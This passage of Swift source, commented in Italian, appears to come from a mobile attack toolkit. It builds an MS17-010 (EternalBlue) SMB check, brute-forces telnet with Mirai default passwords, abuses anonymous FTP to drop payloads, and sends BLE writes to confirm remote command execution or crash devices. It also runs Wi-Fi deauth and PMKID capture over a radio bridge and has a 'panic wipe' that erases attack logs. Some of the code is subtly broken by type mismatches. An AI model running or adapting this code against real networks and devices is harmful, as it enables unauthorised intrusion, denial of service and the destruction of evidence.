                : "8009 chiuso"
        case "os_solaris_rpc":
            let null = Data(hexString: "00000028f572101f0000000000000002000186a0000000020000000000000000000000000000000000000000000000000") ?? Data()
            let d = await rawRT(host, 111, null)
            guard let d, d.count >= 24 else { return "portmap 111: nessuna risposta" }
            return "PORTMAP APERTO su \(host):111 — reply RPC (\(d.count)B) → enum programmi (mountd/rusersd legacy)"
        case "os_embed_ftp":
            let d = await rawRT(host, 21, Data())
            guard let d, !d.isEmpty else { return "ftp 21: chiuso" }
            let b = String(decoding: d.prefix(80), as: UTF8.self)
            let d2 = await rawRT(host, 21, Data("USER anonymous\r\nPASS anon@\r\n".utf8), timeout: 4)
            let s2 = d2.map { String(decoding: $0.prefix(80), as: UTF8.self) } ?? ""
            if s2.contains("230") {
                return "FTP ANON SUCCESS su \(host):21 (\(b.prefix(50))) — upload/download libero → drop payload/config"
            }
            if s2.contains("331") || s2.contains("530") {
                return "FTP APERTO su \(host):21 (\(b.prefix(50))) — anon negato, brute force cred"
            }
            return "ftp banner: \(b.prefix(100))"
        default:
            return "probe non implementata"
        }
    }

    // MS17-010: SMB1 state machine costruita programmaticamente (struttura = MSF smb_ms17_010)
    private func ms17Check(_ host: String) async -> String {
        func smbHeader(_ cmd: UInt8, flags2: UInt16, tid: UInt16 = 0, uid: UInt16 = 0) -> Data {
            var h = Data([0xff, 0x53, 0x4d, 0x42, cmd])
            h += Data([0, 0, 0, 0])                       // status
            h += [0x18]                                   // flags1
            h += withUnsafeBytes(of: flags2.littleEndian) { Data($0) }
            h += Data([0, 0]) + Data([0, 0, 0, 0, 0, 0, 0, 0, 0, 0])  // PID + security blob + reserved
            h += withUnsafeBytes(of: tid.littleEndian) { Data($0) }
            h += Data([0, 0])                             // PID high
            h += withUnsafeBytes(of: uid.littleEndian) { Data($0) }
            h += Data([0, 0])                             // MID
            return h
        }
        // NEGOTIATE — blob noto (uguale a os_win_smb)
        let neg = Data([0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x07,0xc8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00])
        // SESSION_SETUP_ANDX anonymous (user "\")
        var sess = smbHeader(0x73, flags2: 0xc807)
        sess += [0x0d,                                  // WordCount 13
                 0xff, 0x00, 0x00, 0x00,                // AndXCommand/Res/Offset
                 0x00, 0xff,                            // MaxBuffer
                 0x02, 0x00,                            // MaxMpx
                 0x01, 0x00, 0x00, 0x00,                // VCNumber
                 0x00, 0x00, 0x00, 0x00,                // SessionKey
                 0x01, 0x00,                            // ANSI pw len
                 0x00, 0x00,                            // UNI pw len
                 0x00, 0x00,                            // Reserved
                 0x50, 0x00, 0x00, 0x00]                // Capabilities
        let acc = Data("\\\u{00}Windows 2000 2195\u{00}Windows 2000 5.0\u{00}".utf8)
        sess += withUnsafeBytes(of: UInt16(1 + acc.count).littleEndian) { Data($0) } // ByteCount
        sess += Data([0x00]) + acc
        let nl1 = sess.count
        sess.insert(contentsOf: [0x00, 0x00, UInt8(nl1 >> 8), UInt8(nl1 & 0xff)], at: 0) // NBSS 4B: type + len 24-bit BE
        // TREE_CONNECT_ANDX \\host\IPC$
        var tree = smbHeader(0x75, flags2: 0xc807, uid: 0)
        tree += [0x0e,                                  // WordCount 14
                 0xff, 0x00, 0x00, 0x00,                // AndX
                 0x00, 0x00,                            // Flags
                 0x01, 0x00]                            // PasswordLen
        let unc = Data("\\\\\\(host)\\IPC$\u{00}".utf8)
        let trail = unc + Data("?????\u{00}".utf8)
        let bcc = UInt16(1 + trail.count)
        tree += withUnsafeBytes(of: bcc.littleEndian) { Data($0) }
        tree += Data([0x00]) + trail
        let nl2 = tree.count
        tree.insert(contentsOf: [0x00, 0x00, UInt8(nl2 >> 8), UInt8(nl2 & 0xff)], at: 0)
        // TRANS PeekNamedPipe FID 0, \PIPE\
        var trans = smbHeader(0x25, flags2: 0x2801, tid: 0, uid: 0)
        trans += [0x10,                                 // WordCount 16
                 0x00, 0x00,                            // TotalParam
                 0x00, 0x00,                            // TotalData
                 0xff, 0xff,                            // MaxParam
                 0xff, 0xff,                            // MaxData
                 0x00, 0x00,                            // MaxSetup/Reserved
                 0x00, 0x00,                            // Flags
                 0x00, 0x00, 0x00, 0x00,                // Timeout
                 0x00, 0x00,                            // Reserved
                 0x00, 0x00,                            // ParamCount
                 0x4a, 0x00,                            // ParamOffset
                 0x00, 0x00,                            // DataCount
                 0x4a, 0x00,                            // DataOffset
                 0x02, 0x00,                            // SetupCount/Reserved
                 0x23, 0x00,                            // PeekNamedPipe
                 0x00, 0x00]                            // FID 0
        let pipe = Data("\\PIPE\\\u{00}".utf8)
        trans += withUnsafeBytes(of: UInt16(pipe.count).littleEndian) { Data($0) }
        trans += pipe
        let nl3 = trans.count
        trans.insert(contentsOf: [0x00, 0x00, UInt8(nl3 >> 8), UInt8(nl3 & 0xff)], at: 0)

        func patch(_ src: Data, _ range: Range<Int>, _ val: Data) -> Data {
            var d = src; d.replaceSubrange(range, with: val); return d
        }
        func rt(_ s: TCPSession, _ payload: Data) async -> Data? {
            s.send(payload)
            return await withCheckedContinuation { c in s.readFrame { c.resume(returning: $0) } }
        }
        // UNA SOLA connessione per l'intera state machine (UID/TID vivono nel socket)
        let s = TCPSession()
        let up = await withCheckedContinuation { c in s.connect(host, 445) { c.resume(returning: $0) } }
        guard up else { return "MS17-010: 445 non raggiungibile" }
        defer { s.close() }
        _ = await rt(s, neg)
        guard let sr = await rt(s, sess), sr.count >= 34, sr[4] == 0xff else {
            return "MS17-010: session setup anon non conclusiva — server SMB1 filtrato o SMB2-only"
        }
        let treeP = patch(tree, 32..<34, sr.subdata(in: 32..<34)) // UID
        guard let tr = await rt(s, treeP), tr.count >= 30, tr[4] == 0xff else {
            return "MS17-010: tree connect IPC$ fallita — share restritte"
        }
        let transP = patch(patch(trans, 28..<30, tr.subdata(in: 28..<30)), // TID
                           32..<34, tr.subdata(in: 32..<34))               // UID
        guard let fin = await rt(s, transP), fin.count >= 13, fin[4] == 0xff else {
            return "MS17-010: trans2 senza risposta — check non conclusivo"
        }
        let st = [UInt32(fin[9]), UInt32(fin[10]) << 8, UInt32(fin[11]) << 16, UInt32(fin[12]) << 24]
        let status = st[0] | st[1] | st[2] | st[3]
        switch status {
        case 0xC0000205:
            return "MS17-010 VULNERABILE su \(host):445 — PeekNamedPipe FID0 → INSUFF_SERVER_RESOURCES (0xc0000205). EternalBlue precondizioni CONFERMATE (exploit = Metasploit da host esterno)"
        case 0xC0000022, 0xC0000008:
            return "MS17-010: NON vulnerabile (patched — status 0x\(String(status, radix: 16)))"
        default:
            return "MS17-010: check non conclusivo (status 0x\(String(status, radix: 16)))"
        }
    }

    // OPSEC: wipe totale di stato, journal e dump — gesture di panico
    func panicWipe() {
        bridge.stopAll()
        tcpBridge.stopAll()
        tcpBridge.disconnect()
        plan = []; findings = []; attackLog = []; nfcDumps = []; logs = []
        try? FileManager.default.removeItem(at: journalPath)
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        try? FileManager.default.removeItem(at: docs.appendingPathComponent("nfc_dumps"))
        loadDumps()
        phase = .idle
        Haptics.heavy()
        log("PANIC WIPE — stato operativo e journal cancellati", .bad)
    }

    // vettori PLAN eseguibili via bridge radio (BLE ESP32 o TCP ESP8266) quando connesso
    private func runViaBridge(_ e: PlanEntry) async -> String? {
        guard bridge.connected || tcpBridge.connected else { return nil }
        guard let t = e.target, let mac = t.mac, mac.count > 10 else { return nil }
        let ch = Int(t.extra["ch"] ?? "") ?? 6
        switch e.vector.id {
        case "wifi_deauth":
            var ok = false
            if bridge.connected { ok = await bridge.deauth(mac: mac, ch: ch) }
            if !ok && tcpBridge.connected { ok = await tcpBridge.deauth(mac: mac, ch: ch) }
            return ok ? "deauth via bridge ✓ (\(mac) ch\(ch))" : "deauth via bridge FALLITA"
        case "wifi_pmkid":
            var ok = false
            if bridge.connected { ok = await bridge.pmkid(mac: mac, ch: ch) }
            if !ok && tcpBridge.connected { ok = await tcpBridge.pmkid(mac: mac, ch: ch) }
            return ok ? "pmkid capture via bridge ✓ (\(mac))" : "pmkid via bridge FALLITA"
        case "wifi_beaconflood":
            let names = targets.filter { $0.proto == .wifi }.compactMap { $0.extra["rawName"] }
            let list = names.isEmpty ? ["FreeWiFi", "RedHatSec"] : names
            var ok = false
            if bridge.connected { ok = await bridge.beaconSpam(ssids: list) }
            if !ok && tcpBridge.connected { ok = await tcpBridge.beaconSpam(ssids: list) }
            return ok ? "beacon spam via bridge ✓ (\(list.count) SSID)" : "beacon spam FALLITO"
        default:
            return nil
        }
    }

    func recordAttack(vectorID: String, vector: String, target: String, outcome: String, evidence: String) {
        attackLog.append(AttackRecord(vectorID: vectorID, vector: vector, target: target,
                                      outcome: outcome, evidence: String(evidence.prefix(200))))
        journal("attack[\(outcome)] \(vector) @ \(target) — \(String(evidence.prefix(120)))")
    }

    // MARK: - NFC dumps

    private var dumpsDir: URL {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        return docs.appendingPathComponent("nfc_dumps", isDirectory: true)
    }

    func saveDump(_ d: NFCDump) {
        try? FileManager.default.createDirectory(at: dumpsDir, withIntermediateDirectories: true)
        let f = dumpsDir.appendingPathComponent("\(d.uid.replacingOccurrences(of: ":", with: "")).json")
        if let data = try? JSONEncoder().encode(d) { try? data.write(to: f) }
        nfcDumps.append(d)
    }

    func deleteDump(_ d: NFCDump) {
        let f = dumpsDir.appendingPathComponent("\(d.uid.replacingOccurrences(of: ":", with: "")).json")
        try? FileManager.default.removeItem(at: f)
        nfcDumps.removeAll { $0.id == d.id }
    }

    func loadDumps() {
        guard let files = try? FileManager.default.contentsOfDirectory(at: dumpsDir, includingPropertiesForKeys: nil) else { return }
        nfcDumps = files.compactMap { f in
            guard let data = try? Data(contentsOf: f) else { return nil }
            return try? JSONDecoder().decode(NFCDump.self, from: data)
        }
    }

    func replayDump(_ d: NFCDump) {
        log("NFC replay started — avvicina il tag target", .exec)
        Task {
            let lines = await nfc.replay(d)
            for l in lines { log(l, l.contains("✓") ? .good : .warn) }
        }
    }

    private func journal(_ line: String) {        let l = "[\(timeNow())] \(line)"
        if let fh = try? FileHandle(forWritingTo: journalPath) {
            _ = try? fh.seekToEnd()
            try? fh.write(contentsOf: Data((l + "\n").utf8))
            try? fh.close()
        }
    }

    private func runVector(_ e: PlanEntry) async -> String {
        switch e.vector.cap {
        case .shellTool(let tool):
            guard shell.resolve(tool) != nil else {
                return "PLAN (tool '\(tool)' non installato sul device) — prereq: \(e.vector.prereq)"
            }
            let args = templateArgs(e.vector.hint, target: e.target)
            let sh = ShellRunner.shared
            let r = await Task.detached { sh.run(tool, args: args, timeout: 30) }.value
            return "tool \(tool) exit=\(r.exitCode)\nstdout: \(r.stdout.prefix(1000))\nstderr: \(r.stderr.prefix(400))"
        case .plan:
            if let via = await runViaBridge(e) { return via }
            return "PLAN — richiede hardware/radio esterna.\nPrereq: \(e.vector.prereq)\nExec: \(e.vector.hint)"
        case .native:
            return await runNative(e)
        }
    }

    private func templateArgs(_ hint: String, target: TargetDevice?) -> [String] {
        let bssid = target?.mac ?? "00:11:22:33:44:55"
        let host = target?.extra["host"] ?? "192.168.1.1"
        let iface = "wlan0"
        let ch = target?.extra["ch"].flatMap { Int($0).map(String.init) } ?? "6"
        let h = hint
            .replacingOccurrences(of: "<BSSID>", with: bssid)
            .replacingOccurrences(of: "<HOST>", with: host)
            .replacingOccurrences(of: "<IFACE>", with: iface)
            .replacingOccurrences(of: "<CH>", with: ch)
            .replacingOccurrences(of: "<CLIENT>", with: "ff:ff:ff:ff:ff:ff")
        return h.split(separator: " ").map(String.init)
    }

    private func runNative(_ e: PlanEntry) async -> String {
        let id = e.vector.id
        switch id {
        case "ble_enum":
            guard let t = e.target else { return "no target" }
            let rep = await ble.enumerate(t)
            if let w = rep.writable.first, let idx = targets.firstIndex(where: { $0.id == t.id }) {
                targets[idx].extra["svcUUID"] = w.svc
                targets[idx].extra["chrUUID"] = w.chr
                if (targets[idx].extra["payload"] ?? "").isEmpty { targets[idx].extra["payload"] = "0100" }
                targets[idx].extra["autoArm"] = "1"
                log("auto-arm \(t.name): svc=\(w.svc) chr=\(w.chr) payload=0100", .good)
            }
            return rep.lines.isEmpty ? "connect ok, nessun servizio esposto" : rep.lines.joined(separator: "\n")
        case "ble_write":
            guard let t = e.target else { return "no target" }
            guard let hex = t.extra["payload"], !hex.isEmpty else {
                return "WRITE ARMED ma payload non configurato — imposta payload hex dal target detail (es. 0100 per unlock). Esecuzione skip."
            }
            guard let svc = t.extra["svcUUID"], let chr = t.extra["chrUUID"],
                  let data = Data(hexString: hex) else {
                return "payload/svc/chr mancanti — configura nel target detail"
            }
            let r = await ble.write(t, service: svc, characteristic: chr, payload: data)
            return "GATT write → \(r)"
        case "ble_connectflood":
            guard let t = e.target else { return "no target" }
            let n = await ble.flood(t, attempts: 12)
            return "flood: \(n) connect cycle completi — target responsivo = \(n < 6 ? "possibile DoS parziale" : "non impattato")"
        case "ble_sweyntooth":
            guard let t = e.target else { return "no target" }
            let vendor = (t.vendor ?? "sconosciuto").lowercased()
            let socVuln = ["nordic", "ti ", "cc26", "stm32", "stmicro", "nxp", "cypress", "infineon",
                           "silabs", "silicon labs", "telink", "microchip", "dialog", "marvell", "anhui"]
                .contains { vendor.contains($0) }
            let n = await ble.flood(t, attempts: 60)
            var out = "vendor=\(t.vendor ?? "?") vulnerableSoC=\(socVuln) — \(n) connect/disconnect cycles (LL termination stress)"
            if socVuln {
                out += "\nSoC in lista SweynTooth: se il device è scomparso o ha riavviato → CRASH CONFERMATO (CVE-2020-10060/61 family)"
            } else {
                out += "\nvendor non in lista — proof resta banner: monitora se il device sparisce"
            }
            return out
        case "ble_l2cap_probe":
            guard let t = e.target else { return "no target" }
            let psms: [UInt16] = [0x25, 0x41, 0x66]
            var out: [String] = []
            for psm in psms {
                let r = await ble.l2capProbe(t, psm: psm)
                out.append("PSM 0x\(String(psm, radix: 16)): \(r)")
            }
            return out.joined(separator: "\n")
        case "ble_rce":
            guard let t = e.target else { return "no target" }
            let rep = await ble.enumerate(t)
            guard !rep.writable.isEmpty else {
                return "RCE BLE: nessuna chr scrivibile — fai AUTO-PREPARE (connect necessario)"
            }
            var lines: [String] = ["RCE analysis — \(rep.writable.count) chr scrivibili:"]
            var rce = false
            for w in rep.writable {
                let s = w.svc.uppercased(), c = w.chr.uppercased()
                if s.contains("6E400001") || c.contains("6E400002") {
                    let r = await ble.write(t, service: w.svc, characteristic: w.chr, payload: Data("id\n".utf8))
                    lines.append("Nordic UART RX (\(c.prefix(8))): write 'id' → \(r)")
                    if r.lowercased().contains("uid=") { rce = true }
                } else if s.contains("8EC90001") || s.contains("FE59") || c.contains("8EC90003") {
                    lines.append("DFU/SMP (\(s.prefix(8))): char firmware-upload APERTA → flash arbitraria = RCE totale (serve .bin completo)")
                    rce = true
                } else if s.contains("0000FF") || s.contains("-FFE") || s.contains("-FFF") || c.contains("0000FF") {
                    let r = await ble.write(t, service: w.svc, characteristic: w.chr, payload: Data("AT\r\n".utf8))
                    lines.append("AT probe (\(c.prefix(8))): \(r)")
                    if r.contains("OK") { rce = true }
                } else {
                    lines.append("chr vendor \(c.prefix(8)): fuori firma — payload manuale dal detail")
                }
            }
            lines.append(rce
                ? "VERDETTO: canale comando nativo attivo → RCE via BLE CONFERMATA (armare payload reale dal detail)"
                : "VERDETTO: canali vendor raggiunti, nessun canale comando noto — proof resta reach")
            return lines.joined(separator: "\n")
        case "os_android_adb", "os_ios_lockdown", "os_win_smb", "os_win_rdp",
             "os_linux_ssh", "os_linux_cups", "os_mac_rmd", "os_iot_tuya",
             "os_win_ms17_010", "os_unix_telnet", "os_unix_rlogin", "os_win_epmapper",
             "os_win_winrm", "os_linux_nfs", "os_linux_ldap", "os_mac_afp",
             "os_mac_bonjour", "os_ios_airplay", "os_android_dial", "os_solaris_rpc",
             "os_embed_ftp":
            return await runOSProbe(id, e)
        case "os_android_fastpair":
            guard let t = e.target else { return "no target" }
            let svc = (t.services ?? []).contains { $0.contains("Fast Pair") }
            return "Fast Pair: \(svc ? "FE9F in ADV → device Android (model ID → identità device)" : "nessun adv Fast Pair — ri-scan") · companyID=\(t.extra["companyID"] ?? "?")"
        case "os_ios_continuity":
            guard let t = e.target else { return "no target" }
            return (t.vendor ?? "").contains("Apple")
                ? "Continuity adv Apple (0x004C) visto — device Apple vicino: fingerprint handoff/hotspot nel detail"
                : "nessun adv Apple visto — ri-scan"
        case "net_mqtt":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            if tcpBridge.connected { return await bridgeMQTT(host) }
            return await netMQTT(host)
        case "net_coap":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            if tcpBridge.connected {
                let d = await bridgeRT(host, 5683, coapGetWellKnown(), udp: true, timeout: 4)
                return d.map { "CoAP reply via bridge: \(String(decoding: $0, as: UTF8.self).prefix(500))" }
                     ?? "nessuna risposta CoAP via bridge — porta chiusa o DTLS richiesto"
            }
            let req = coapGetWellKnown()
            let r = await udpRoundTrip(host: host, port: 5683, payload: req, timeout: 3)
            return r.isEmpty ? "nessuna risposta CoAP — porta chiusa o DTLS richiesto" : "CoAP reply: \(r.prefix(600))"
        case "net_snmp":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            if tcpBridge.connected {
                let d = await bridgeRT(host, 161, snmpGetSysDescr(), udp: true, timeout: 4)
                return d.map { "SNMP sysDescr via bridge: \(String(decoding: $0, as: UTF8.self).prefix(400))" }
                     ?? "nessuna risposta SNMP via bridge (community non accettata o UDP filtrato)"
            }
            let r = await udpRoundTrip(host: host, port: 161, payload: snmpGetSysDescr(), timeout: 3)
            return r.isEmpty ? "nessuna risposta SNMP (community default non accettata o UDP filtrato)"
                             : "SNMP sysDescr: \(r.prefix(400))"
        case "net_modbus":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            if tcpBridge.connected {
                let d = await bridgeRT(host, 502, modbusReadHolding(), timeout: 4)
                return d.map { "Modbus reply via bridge (hex): \($0.map { String(format: "%02x", $0) }.joined().prefix(200))" }
                     ?? "nessuna risposta Modbus/TCP via bridge"
            }
            let r = await tcpRoundTrip(host: host, port: 502, payload: modbusReadHolding(), timeout: 3)
            return r.isEmpty ? "nessuna risposta Modbus/TCP" : "Modbus reply (hex): \(r.prefix(200))"
        case "net_rtsp":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            let req = "OPTIONS rtsp://\(host):554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            if tcpBridge.connected {
                let d = await bridgeRT(host, 554, Data(req.utf8), timeout: 4)
                return d.map { "RTSP via bridge: \(String(decoding: $0, as: UTF8.self).prefix(400))" }
                     ?? "RTSP muto via bridge — porta chiusa"
            }
            let r = await tcpRoundTrip(host: host, port: 554, payload: req.data(using: .ascii) ?? Data(), timeout: 3)
            return r.isEmpty ? "RTSP muto — porta chiusa" : r.prefix(500).description
        case "net_telnet":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            if tcpBridge.connected { return await bridgeTelnet(host) }
            return await netTelnet(host)
        case "net_upnp":
            guard let t = e.target, let host = t.extra["host"] else { return "no host" }
            if tcpBridge.connected { return await bridgeUPnP(host) }
            return await netUPnP(host)
        default:
            return "handler nativo non implementato per \(id) — trattato come PLAN"
        }
    }

    // MARK: - Net payload builders

    private func vbi(_ n: Int) -> Data {
        var b: [UInt8] = []; var v = n
        repeat { var d = UInt8(v % 128); v /= 128; if v > 0 { d |= 0x80 }; b.append(d) } while v > 0
        return Data(b)
    }

    private func mqttConnectPacket() -> Data {
        var pl = Data([0x00, 0x04]) + "MQTT".data(using: .ascii)!
        pl += Data([0x04, 0x02, 0x00, 0x3C, 0x00, 0x05]) + "rhs-a".data(using: .ascii)!
        return Data([0x10]) + vbi(pl.count) + pl
    }

    private func mqttSubscribePacket() -> Data {
        var sp = Data([0x00, 0x01])
        sp += Data([0x00, 0x01]) + Data("#".utf8) + Data([0x01])
        return Data([0x82]) + vbi(sp.count) + sp
    }

    private func netMQTT(_ host: String) async -> String {
        let connect = mqttConnectPacket()
        let ack = await tcpRoundTrip(host: host, port: 1883, payload: connect, timeout: 4, maxRecv: 1)
        guard let first = ack.utf8.first, first == 0x20 else {
            return "CONNECT inviato — CONNACK non ricevuto (\(ack.isEmpty ? "muto" : "hex \(ack.prefix(60))")) — broker chiude o auth richiesta"
        }
        let sub = mqttSubscribePacket()
        let msgs = await tcpRoundTrip(host: host, port: 1883, payload: sub, timeout: 6, maxRecv: 6)
        return "CONNACK OK — broker APERTO (no auth). SUBSCRIBE # → traffico: \(msgs.prefix(800).isEmpty ? "(silenzio, ma broker scrivibile)" : msgs.prefix(800).description)"
    }

    private func coapGetWellKnown() -> Data {
        var d = Data([0x41, 0x01, 0x00, 0x01])
        d += Data([0xBA]) + Data("well-known".utf8)
        d += Data([0x04]) + Data("core".utf8)
        return d
    }

    private func snmpGetSysDescr() -> Data {
        Data([0x30, 0x29, 0x02, 0x01, 0x00, 0x04, 0x06,
              0x70, 0x75, 0x62, 0x6C, 0x69, 0x63,
              0xA0, 0x1C, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
              0x02, 0x01, 0x00, 0x02, 0x01, 0x00,
              0x30, 0x0E, 0x30, 0x0C, 0x06, 0x08,
              0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00, 0x05, 0x00])
    }

    private func modbusReadHolding() -> Data {
        Data([0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x01])
    }

    private func netTelnet(_ host: String) async -> String {
        let creds: [(String, String)] = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"),
                                         ("root", "root"), ("admin", "1234"), ("root", "1234")]
        for (u, p) in creds {
            let banner = await tcpRoundTrip(host: host, port: 23, payload: Data(), timeout: 2, maxRecv: 1)
            let attempt = "\(u)\n\(p)\n".data(using: .ascii)!
            let r = await tcpRoundTrip(host: host, port: 23, payload: attempt, timeout: 3, maxRecv: 3, delaySend: 0.8)
            if r.contains("BusyBox") || r.contains("Welcome") || r.lowercased().contains("uid=") || r.contains("~#") {
                return "SUCCESS — telnet \(u):\(p) su \(host). Banner: \(banner.prefix(100))\nShell prompt: \(r.prefix(300))"
            }
        }
        return "telnet table Mirai esaurita su \(host) — nessuna cred di default valida"
    }

    private func netUPnP(_ host: String) async -> String {
        let search = "M-SEARCH * HTTP/1.1\r\nHOST: \(host):1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
        let resp = await udpRoundTrip(host: host, port: 1900, payload: search.data(using: .ascii)!, timeout: 4)
        guard !resp.isEmpty, resp.contains("LOCATION") else { return "UPnP: M-SEARCH unicast senza risposta" }
        let loc = resp.split(separator: "\n").first { $0.uppercased().contains("LOCATION") }?
            .split(separator: ":", maxSplits: 1).last.map { $0.trimmingCharacters(in: .whitespaces) } ?? ""
        guard !loc.isEmpty else { return "UPnP: LOCATION assente\n\(resp.prefix(300))" }
        let lport = UInt16(loc.portPart()) ?? 80
        let path = URL(string: loc)?.path ?? "/"
        let req = "GET \(path) HTTP/1.1\r\nHost: \(host):\(lport)\r\n\r\n"
        let desc = await tcpRoundTrip(host: host, port: lport, payload: req.data(using: .ascii)!, timeout: 4)
        var friendly = "?"
        if let r = desc.range(of: "<friendlyName>(.*?)</friendlyName>", options: .regularExpression) {
            friendly = String(desc[r])
        }
        return "UPnP device: \(friendly.isEmpty ? "?" : friendly)\nLOCATION: \(loc)\n\(desc.prefix(400))"
    }

    private func tcpRoundTrip(host: String, port: UInt16, payload: Data, timeout: TimeInterval,
                              maxRecv: Int = 3, delaySend: TimeInterval = 0) async -> String {
        let d = await tcpRoundTripData(host: host, port: port, payload: payload, timeout: timeout,
                                       maxRecv: maxRecv, delaySend: delaySend)
        return String(data: d, encoding: .isoLatin1) ?? d.hexPreview
    }

    // variante Data: i protocolli binari (SMB/ADB/MQTT) non passano da string re-encode
    private func tcpRoundTripData(host: String, port: UInt16, payload: Data, timeout: TimeInterval,
                                  maxRecv: Int = 3, delaySend: TimeInterval = 0) async -> Data {
        await withCheckedContinuation { c in
            NetIO.tcpSendRecv(host: host, port: port, payload: payload, timeout: timeout,
                              maxRecv: maxRecv, delaySend: delaySend) { c.resume(returning: $0) }
        }
    }

    private func udpRoundTrip(host: String, port: UInt16, payload: Data, timeout: TimeInterval) async -> String {
        await withCheckedContinuation { c in
            NetScanner.udpPoke(host: host, port: port, payload: payload, timeout: timeout) {
                c.resume(returning: $0)
            }
        }
    }
}

// connessione TCP persistente con framing NBSS (per state machine SMB)
final class TCPSession {
    private var conn: NWConnection?
    private var buf = Data()
    private var frameHandler: ((Data?) -> Void)?
    private var alive = false
    private let q = DispatchQueue(label: "rhs.tcp.session")

    func connect(_ host: String, _ port: UInt16, timeout: TimeInterval = 5, onReady: @escaping (Bool) -> Void) {
        guard let p = NWEndpoint.Port(rawValue: port) else { onReady(false); return }
        let c = NWConnection(host: NWEndpoint.Host(host), port: p, using: .tcp)
        var decided = false
        conn = c
        let ready: (Bool) -> Void = { [weak self] ok in
            guard let self, !decided else { return }
            decided = true
            if ok {
                self.alive = true
                self.pump(c)
            }
            onReady(ok)
        }
        c.stateUpdateHandler = { [weak self] st in
            switch st {
            case .ready: ready(true)
            case .failed, .cancelled:
                self?.alive = false
                ready(false)
            default: break
            }
        }
        c.start(queue: q)
        q.asyncAfter(deadline: .now() + timeout) { ready(false) }
    }

    func send(_ payload: Data, completion: ((Bool) -> Void)? = nil) {
        q.async {
            guard let c = self.conn, self.alive else { completion?(false); return }
            c.send(content: payload, completion: .contentProcessed { e in completion?(e == nil) })
        }
    }

    // attende la prossima frame NBSS completa dal buffer
    func readFrame(timeout: TimeInterval = 4, onFrame: @escaping (Data?) -> Void) {
        q.async {
            guard self.alive else { onFrame(nil); return }
            var fired = false
            let fire: (Data?) -> Void = { f in
                if !fired { fired = true; self.frameHandler = nil; onFrame(f) }
            }
            self.frameHandler = fire
            self.q.asyncAfter(deadline: .now() + timeout) { fire(nil) }
            self.flushFrame()
        }
    }

    private func pump(_ c: NWConnection) {
        guard alive else { return }
        c.receive(minimumIncompleteLength: 1, maximumLength: 16384) { d, _, _, _ in
            if let d = d, !d.isEmpty {
                self.buf += d
                self.flushFrame()
            }
            if self.alive { self.pump(c) }
        }
    }

    private func flushFrame() {
        guard buf.count >= 4 else { return }
        // NBSS 4 byte: [type][len 24-bit BE] — parse completo
        let len = Int(buf[1]) << 16 | Int(buf[2]) << 8 | Int(buf[3])
        guard buf.count >= 4 + len, buf[0] == 0x00 else { return }
        let f = Data(buf.prefix(4 + len))
        buf.removeFirst(4 + len)
        frameHandler?(f)
    }

    func close() {
        alive = false
        conn?.cancel()
    }
}

enum NetIO {
    static func tcpSendRecv(host: String, port: UInt16, payload: Data, timeout: TimeInterval,
                            maxRecv: Int, delaySend: TimeInterval, onResult: @escaping (Data) -> Void) {
        guard let p = NWEndpoint.Port(rawValue: port) else { onResult(""); return }
        let c = NWConnection(host: NWEndpoint.Host(host), port: p, using: .tcp)
        // done/out condivisi tra NW queue e timer → tutto dietro lock (no double-finish)
        let lock = NSLock()
        var done = false
        var out = Data()
        var recvCount = 0
        func snapshot() -> Data {
            lock.lock(); defer { lock.unlock() }
            return out
        }
        let finish: (String) -> Void = {
            lock.lock()
            let first = !done
            if first { done = true }
            lock.unlock()
            guard first else { return }
            c.cancel()
            onResult($0)
        }
        c.stateUpdateHandler = { st in
            switch st {
            case .ready:
                let sendBlock = { c.send(content: payload.isEmpty ? nil : payload,
                                         completion: .contentProcessed { _ in }) }
                if delaySend > 0 {
                    DispatchQueue.global().asyncAfter(deadline: .now() + delaySend, execute: sendBlock)
                } else {
                    sendBlock()
                }
                pump()
            case .failed, .cancelled:
                finish(snapshot())
            default: break
            }
        }
        func pump() {
            lock.lock()
            let finished = done
            lock.unlock()
            guard !finished else { return }
            c.receive(minimumIncompleteLength: 1, maximumLength: 8192) { d, _, isComplete, err in
                lock.lock()
                if let d = d, !d.isEmpty {
                    out += d
                    recvCount += 1
                }
                let stop = recvCount >= maxRecv
                lock.unlock()
                if stop || isComplete || err != nil { finish(snapshot()); return }
                pump()
            }
        }
        c.start(queue: .global(qos: .utility))
        DispatchQueue.global().asyncAfter(deadline: .now() + timeout) { finish(snapshot()) }
    }
}
